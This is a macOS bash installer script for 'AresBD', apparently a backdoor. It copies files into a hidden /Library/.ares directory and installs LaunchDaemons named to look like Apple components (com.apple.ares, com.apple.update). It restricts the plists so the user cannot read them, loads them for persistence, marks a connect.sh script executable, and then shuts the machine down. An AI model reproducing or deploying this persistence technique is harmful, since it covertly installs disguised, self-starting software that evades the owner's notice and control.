#!/bin/bash

#  install.sh
#  AresBD
#
#  Copyright (c) 2015 Stsosz Systems. All rights reserved.
sudo mount -uw /

mkdir -vp /Library/.ares

mkdir -vp /Library/LaunchDaemons

cp -v /Volumes/Ares/ares-hidden /Library/.ares

cp -v /Volumes/Ares/LaunchDaemons /Library/LaunchDaemons

echo "Making everything executable..."
chmod +x /Library/.ares/connect.sh
chmod +x /Library/.ares/update.sh
echo "Done"
echo ""

echo "Making sure that the user cannot read plists..."
chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
chmod 600 /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Loading plists into LaunchCTL"
launchctl load /Library/LaunchDaemons/com.apple.ares.plist
launchctl load /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Install Complete."
echo ""

echo "Press enter to shut down..."
read shutdown

echo "Shutting down..."
shutdown -h now